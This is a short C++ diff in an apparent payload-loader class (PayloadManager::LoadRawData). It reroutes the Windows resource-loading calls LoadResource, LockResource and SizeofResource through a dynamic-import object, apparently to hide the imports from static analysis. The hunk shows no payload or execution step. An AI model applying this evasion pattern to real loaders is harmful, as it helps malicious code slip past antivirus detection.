@@ -18,19 +18,19 @@ pair<BYTE*, DWORD> PayloadManager::LoadRawData() {
         return make_pair(nullptr, 0x0);
     }
 
-    HGLOBAL hLoadedResource = LoadResource(m_hInstance, hResource);
+    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);
 
     if (!hLoadedResource) {
         return make_pair(nullptr, 0x0);
     }
 
-    LPVOID pLockedResource = LockResource(hLoadedResource);
+    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);
 
     if (!pLockedResource) {
         return make_pair(nullptr, 0x0);
     }
 
-    DWORD dwResourceSize = SizeofResource(m_hInstance, hResource);
+    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);
 
     if (!dwResourceSize) {
         return make_pair(nullptr, 0x0);
